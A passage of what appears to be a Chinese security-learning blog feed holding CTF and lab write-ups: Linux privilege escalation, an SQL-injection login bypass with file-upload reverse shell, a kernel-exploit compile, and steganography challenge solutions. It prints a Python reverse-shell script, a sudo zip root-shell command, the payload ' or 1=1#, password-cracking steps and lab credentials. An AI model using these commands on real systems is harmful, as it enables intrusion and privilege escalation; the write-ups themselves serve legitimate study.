src="https://img-blog.csdnimg.cn/20200818235525967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>发包，成功。</p><p><img src="https://img-blog.csdnimg.cn/2020081823541586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><font color=#999AAA >这个靶场确实很好，综合漏洞靶场，学到了许多知识，先记录一部分，后面再另写一篇。继续加油。</p>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux系统提权———基于已经拿到www-data权限</title>
      <link href="/posts/1d02ae7a/"/>
      <url>/posts/1d02ae7a/</url>
      
        <content type="html"><![CDATA[<p>前言：上次学习利用目录遍历漏洞获取了一个反弹的webshell，但是权限是www-data，不是root权限，所以这次学习提权，拿到root权限。</p><h2 id="提权介绍"><a href="#提权介绍" class="headerlink" title="提权介绍"></a>提权介绍</h2><p>往往我们能拿下服务器的web服务只是具有低权限用户(www-data)，对于内网渗透，我们需要提权到root。linux系统的提权过程不止涉及到了漏洞，也涉及了很多系统配置。<br>提权前提：</p><ul><li>已经拿到低权shell</li><li>被入侵的机器上面有nc，python，perl等非常常见的工具</li><li>有权限上传文件和下载文件</li></ul><p>学习环境依然是上次的shell获取的www-data权限</p><h1 id="提权方式"><a href="#提权方式" class="headerlink" title="提权方式"></a>提权方式</h1><h2 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h2><p>内核漏洞一般是首选考虑的，先查看是否可以使用内核漏洞进行提权。先对系统做个了解</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#查看发行版本</span><span class="token function">cat</span> /etc/issue<span class="token function">cat</span> /etc/*-release<span class="token comment"># 查看内核版本</span><span class="token function">uname</span> -a</code></pre><p><img src="https://img-blog.csdnimg.cn/20200808002259701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>看到发行版本是<code>Ubuntu 12.04.5</code><br>寻找内核溢出代码使用searchsploit<br>但是发现并没有，可以适合这个版本的漏洞模块；但是有12.04的，不过不行；<br><img src="https://img-blog.csdnimg.cn/20200808002340356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>没有这个，所以没办法利用；如果存在可以利用的，那么使用方法就是</p><pre class="language-bash" data-language="bash"><code class="language-bash">gcc xxx.c -o exploit<span class="token function">chmod</span> +x exploit./exploit</code></pre><p>这个是内核溢出的提权，不过一般用不上。</p><h2 id="明文root密码提权"><a href="#明文root密码提权" class="headerlink" title="明文root密码提权"></a>明文root密码提权</h2><p>大多linux系统的密码都和<code>/etc/passwd</code>、<code>/etc/shadow</code>这两个配置文件相关的；passwd里面储存了用户，shadow里面是密码的hash；且passwd是全用户可读，root可写。shadow是仅root可以进行读写的。<br>破解linux用户名和对应的密码</p><pre class="language-bash" data-language="bash"><code class="language-bash">/etc/passwd  /etc/shadowunshadow <span class="token function">passwd</span> shadow <span class="token operator">></span> crackedjohn cracked</code></pre><p>使用John这个工具来破解。<br>到kali中查看这两个文件，passwd可以查看，shadow是无法查看的<br><img src="https://img-blog.csdnimg.cn/20200808002405453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>所以此方法也不行，不过倒是可以在root权限下查看密码(前提是不知道root密码)</p><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root用户的计划任务的。但是<code>/etc/</code>内系统的计划任务可以被列出<br>默认这些程序以root权限执行，如果刚好遇到一个把其中脚本配置成可以任意用户可写的，这个时候就可以修改脚本等回连rootshell；如果定时执行的文件时python脚本，可以使用下面的脚本来替换之前的脚本。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> os<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>sockets<span class="token operator">=</span>socket<span class="token punctuation">.</span>socekt<span class="token punctuation">(</span>sicket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"10.0.2.4"</span><span class="token punctuation">,</span><span class="token string">"4444"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>p<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-i"</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>测试时查看<code>/etc/crontab</code>发现并没有可写权限的文件<br><img src="https://img-blog.csdnimg.cn/20200808002446833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>所以此方法行不通。</p><h2 id="密码复用"><a href="#密码复用" class="headerlink" title="密码复用"></a>密码复用</h2><p>很多管理员会重读使用密码，因此数据库或者web后台的密码也许就是root密码。</p><p>有了疑似root密码，第一时间想到ssh登录，但是ssh很可能禁止root登录，或者是防火墙规则等因素排除。之前已经得到一个低权限的shell，但是直接在低权限里使用sudo是不奏效的。出于安全考虑，linux要求用户必须从终端设备（tty）中输入密码，而不是标准输入，也就是说sudo在输入密码的时候本质是读取键盘，而不是bash里面的字符。因此要输入密码，还需要一个终端设备。python有这种功能的，就是模拟化终端，输入</p><pre class="language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"import pty;pty.spawn('/bin/bash')"</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200808002524296.png" alt="m0re" loading="lazy"></p><p>可以看到是已经启动了虚拟终端<br>然后找到了一些信息，因为是靶场，而且是学习提权的，这个寻找信息的过程就不写了。<br>找到一个用户名为<code>zico</code>密码为<code>sWfCsfJSPV9H3AmQzw8</code>的一个用户。<br>而日是开放了ssh服务的，所以可以直接进行ssh登录<br><img src="https://img-blog.csdnimg.cn/20200808002545584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>看到了登录成功，密码正确。</p><p>利用zip进行提权<br><code>sudo -l</code>查看了当前可以使用root提权的命令信息。<br>返回以下结果</p><pre class="language-bash" data-language="bash"><code class="language-bash">Matching Defaults entries <span class="token keyword">for</span> zico on this host:    env_reset, <span class="token assign-left variable">exempt_group</span><span class="token operator">=</span>admin,    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/binUser zico may run the following commands on this host:    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /bin/tar    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/zip</code></pre><p>可以使用zip进行提权</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span> exploit<span class="token function">sudo</span> -u root <span class="token function">zip</span> exploit.zip exploit -T --unzip-command<span class="token operator">=</span><span class="token string">"sh -c /bin/bash"</span></code></pre><p>发现得到了root权限<br><img src="https://img-blog.csdnimg.cn/202008080026057.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ol><li>内核漏洞<br>在kali当中找相应版本的漏洞，看有无适应当前版本的可以利用的漏洞。</li><li>明文root密码<br>要求拿到的用户，刚好有可以读取shadow和passwd文件的权限。</li><li>计划任务<br>计划的任务修改执行对应的脚本可以获取root权限，待尝试~</li><li>密码复用<br>已知其他用户的密码，可以推测root用户的密码也是相同的（PS：不得不说我自己的就是，我的kali普通用户和root用户设置的密码是一样的，因为懒）<br>以上是几种常见的提权方式，这次学习收获很多。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF靶场系列结————综合环境</title>
      <link href="/posts/a1ff0411/"/>
      <url>/posts/a1ff0411/</url>
      
        <content type="html"><![CDATA[<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><font color=#999AAA >这次就是靶场系列的最后一篇了，这段时间学习这个系列的知识，感觉确实学到很多东西。现在做一下总结吧。</font></p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="一、综合环境——低难度"><a href="#一、综合环境——低难度" class="headerlink" title="一、综合环境——低难度"></a>一、综合环境——低难度</h1><p><font color=#999AAA >tip：emmm，与之前重复的内容这里就不再提了，主要记录下思路。</p><p><font color=#999AAA >使用nikto和dirb等工具探测过后，发现了以下敏感页</p><pre class="language-bash" data-language="bash"><code class="language-bash">login.phpindex.phpconfig.php</code></pre><p><font color=#999AAA >其中login.php是个登录页面。没有信息，先查看源码(其实我先尝试了弱口令，但是没有成功，还是乖乖的看源码)<br>在源码的最后发现了javascript的代码</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">control</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> user <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">var</span> pwd <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"pwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span><span class="token keyword">var</span> str<span class="token operator">=</span>user<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"@"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>user<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pwd <span class="token operator">==</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Hack Denemesi !!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token operator">!=</span><span class="token string">"btrisk.com"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Yanlis Kullanici Bilgisi Denemektesiniz"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>      document<span class="token punctuation">.</span>loginform<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><font color=#999AAA >审计这段代码：substring和lastIndexOf都是截取字符串的两个函数，首先来了解一下这两个函数。<br><code>substring()</code><br><img src="https://img-blog.csdnimg.cn/20200819014131837.png" alt="m0re" loading="lazy"><br><font color=#999AAA >注意：如果start传入的参数比stop的参数大的话，该函数会自动调换start和stop的位置。参数 start 与 stop 相等，那么该方法返回的就是一个空串（即长度为 0 的字符串）。<br>下面是一个栗子：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">string start <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>string stop <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>string str <span class="token operator">=</span> <span class="token string">"abcdefg"</span><span class="token punctuation">;</span>start <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">Substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//从第一个开始截取，共截取一位</span>stop <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">Substring</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span>Length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//从最后一个开始截取，共截取一位</span>Response<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>qian <span class="token operator">+</span> <span class="token string">"***"</span> <span class="token operator">+</span> hou<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><font color=#999AAA >输出结果：<code>a***g</code><br><code>lastIndexOf()</code><br><font color=#999AAA >作用：可返回一个指定的字符串值最后出现的位置，在一个字符串中的指定位置从后向前搜索<br><img src="https://img-blog.csdnimg.cn/20200819014638818.png" alt="m0re" loading="lazy"><br>注意：<code>lastIndexOf()</code> 方法对大小写敏感！<br>如果要检索的字符串值没有出现，则该方法返回 -1。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">string str <span class="token operator">=</span> <span class="token string">"m0re"</span><span class="token punctuation">;</span>str <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">Substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> str<span class="token punctuation">.</span><span class="token function">LastIndexOf</span><span class="token punctuation">(</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Response<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><font color=#999AAA >截取r前面的字符串，输出为<code>m0</code><br>OK，这下再看代码就可以理解了。<br>1、首先<code>lastIndexOf()</code>先在user中查询<code>@</code>的位置，然后从其位置的后一位开始，到user的总长度这个范围内，substring函数起作用，截取字符串str。<br>2、继续，pwd不等于<code>&#39;</code>，猜测可能是防万能密码的吧。或者是绕过SQL注入。<br>3、str要等于btrisk.com<br><img src="https://img-blog.csdnimg.cn/20200819020406723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后进来一个页面，闹了半天没发现什么，最后才知道是姿势错了。不过也没白折腾。有学到新知识。<br><font color=#11FF11 >正确的姿势：<br><font color=#999AAA >对登录框进行fuzz测试，kali的wordlists下有字典，可以直接利用，抓包发送到 Intruder模块<br><img src="https://img-blog.csdnimg.cn/20200819021623822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>载入字典进行fuzz测试<br>直接测试成功，看到response页面有内容，去字典中找到这个payload进行登录。<br><img src="https://img-blog.csdnimg.cn/20200819022010285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>用户名：<code>@btrisk.com</code>密码：<code>&#39; or 1=1#</code></p><p><img src="https://img-blog.csdnimg.cn/20200819022438391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >这才是正确的界面。<br>然后就是文件上传，基础漏洞。进行测试，只能传图片。<br><img src="https://img-blog.csdnimg.cn/20200819103959937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >鉴于不知道是验证方式是什么，所以都测试一遍。先设置好代理，测试发现是前端检测。<br>使用burpsuite绕过前端检测，或者使用<code>%00</code>截断绕过。<br>只需要简单的修改后缀就可以了，其他的验证就没有了。<br>尝试可以进行绕过，就制作一个反弹shell，然后监听获取权限就OK了。<br>重复步骤。<br>然后得到一个www-data用户的权限，尝试提权，发现<code>sudo -l</code>返回的是</p><pre class="language-bash" data-language="bash"><code class="language-bash">sudo: unable to resolve <span class="token function">host</span> BTRsys1sudo: no <span class="token function">tty</span> present and no askpass program specified</code></pre><p><font color=#999AAA >没见过这样的，先放在一边。但是可以查看配置文件，之前扫描出来一个<code>config.php</code>，但是访问没有任何信息，这里可以cat一下源码。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/////////////////////////////////////////////////////////////////////////////////////////</span><span class="token variable">$con</span><span class="token operator">=</span><span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"localhost"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"root"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"toor"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"deneme"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Mysql Bağlantı hatası!: "</span> <span class="token punctuation">.</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token comment">/////////////////////////////////////////////////////////////////////////////////////////</span><span class="token delimiter important">?></span></span></code></pre><p><font color=#999AAA >数据库root用户的密码是<code>toor</code><br>连接数据库前，先优化一下终端，因为数据库输入密码时，是读取键盘记录的，而shell是无法完成的，所以还是先进行优化一下终端。<br>然后进入数据库，进行遍历，查看到用户名密码，尝试提权<code>su - root</code><br>使用密码<code>asd123***</code></p><p><img src="https://img-blog.csdnimg.cn/20200819112943215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>最后得到flag。</p><h1 id="二、综合环境——较高难度"><a href="#二、综合环境——较高难度" class="headerlink" title="二、综合环境——较高难度"></a>二、综合环境——较高难度</h1><p><font color=#999AAA >这个其他没什么可记录的，就一点——内核提权</p><pre class="language-bash" data-language="bash"><code class="language-bash">searchsploit ubuntu <span class="token number">4.4</span>.0</code></pre><p><img src="https://img-blog.csdnimg.cn/20200819153606983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >复制到桌面进行编译，</p><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali:~/Desktop<span class="token comment"># gcc 41458.c -o rootshell</span>root@kali:~/Desktop<span class="token comment"># ls</span><span class="token number">41458</span>.c  rootshell</code></pre><p><font color=#999AAA >然后利用meterpreter的upload命令将rootshell上传并加权，进行chmod命令时，需要在反弹shell中执行，<br>赋予rootshell以777权限后执行文件就可以提权成功了。</p><pre class="language-bash" data-language="bash"><code class="language-bash">./rootshell</code></pre><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><font color=#999AAA >涉及知识点：代码审计、fuzz测试、万能密码、文件上传、弱口令、内核提权<p><font color=#999AAA >CTF靶场系列就算完工了，还要继续努力鸭。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>近段时间参加的CTF竞赛部分题目复现</title>
      <link href="/posts/a4746890/"/>
      <url>/posts/a4746890/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近比赛比较多，记录一下赛后总结</p><h1 id="ISCC-Misc"><a href="#ISCC-Misc" class="headerlink" title="ISCC  Misc"></a>ISCC  Misc</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p><img src="https://img-blog.csdnimg.cn/20200502105955393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>打开文件，一张png图片，在010Editor或winhex打开，找到修改高度就得到了flag，<img src="https://img-blog.csdnimg.cn/20200502110203773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>但是flag不是对的，然后想着肯定加密了，所以就去挨个试试，然后发现时维吉尼亚密码，密钥就是high，解密就得到flag。<br><img src="https://img-blog.csdnimg.cn/20200502110436465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h2 id="耳听为实"><a href="#耳听为实" class="headerlink" title="耳听为实"></a>耳听为实</h2><p><img src="https://img-blog.csdnimg.cn/20200511224733860.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>这道题也是突然有了灵感，当时没事在搜”音频隐写”，然后就看到了mp3stego这个工具(工具下载可直接在百度搜索，同时我将更新了我的安装配置踩坑记录这篇博客——里面有几个工具的，有兴趣的可以看下哦。)<br>需要密码，用010Editor打开音频文件，看到信息<br><img src="https://img-blog.csdnimg.cn/20200511225208799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>没错的，就是flag。<br>然后将<code>ABC.mp3</code>复制一份到MP3stego工具的目录下</p><pre class="language-bash" data-language="bash"><code class="language-bash">Decode.exe -X ABC.mp3 -P flag</code></pre><p>然后看到目录下生成一个txt文件。<br>打开看到信息<br><img src="https://img-blog.csdnimg.cn/20200511225541453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>百度网盘链接，那明显下面的base64编码就是提取密码了<br>又是一个音频，听了一遍，嗯，听不出来，那就下载那个音频在010Editor查看，<br><img src="https://img-blog.csdnimg.cn/20200511225956869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>在开头发现它是压缩包，还在末尾发现了<code>flag-RD.wav</code>,然后就改后缀，解压。<br><img src="https://img-blog.csdnimg.cn/20200511230152960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>当时就看不懂了。到这里就断了，好不甘心的。害！</p><p>emmm，听学长说可以直接对提交框进行爆破。这个操作666，正好flag是弱口令。这真想不到😂。<br>flag{password}</p><h2 id="千层套路"><a href="#千层套路" class="headerlink" title="千层套路"></a>千层套路</h2><p><img src="https://img-blog.csdnimg.cn/20200516222320228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>一个GIF动图，拼出来是这样的。<br><img src="https://img-blog.csdnimg.cn/20200516222335733.png" alt="j4y" loading="lazy"><br>先记在记事本中。<br>binwalk查看有没有隐藏文件。<br>看到有压缩包。分离出来。<br>需要密码才能解压。将记事本中的字符串输入。解压得到文件。<br>一个PDF文件、一个文本文件。看不懂，没有头绪，找学长问了下思路，了解到是需要像素点画图。用到了脚本。看了学长的博客：<a href="https://blog.csdn.net/qq_43625917/article/details/105259442#t12">千层套路</a><br>将脚本搬过来</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagex <span class="token operator">=</span> <span class="token number">141</span>    <span class="token comment">#x坐标  通过对txt里的行数进行整数分</span>y <span class="token operator">=</span> <span class="token number">726</span>    <span class="token comment">#y坐标  x * y = 行数</span>im <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>        line <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#获取一行的rgb值</span>        line <span class="token operator">=</span> line<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>        line <span class="token operator">=</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token comment">#print(line)</span>        rgb <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">", "</span><span class="token punctuation">)</span>  <span class="token comment">#分离rgb，文本中逗号后面有空格</span>        im<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>rgb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rgb<span class="token punctuation">[</span><span class="token 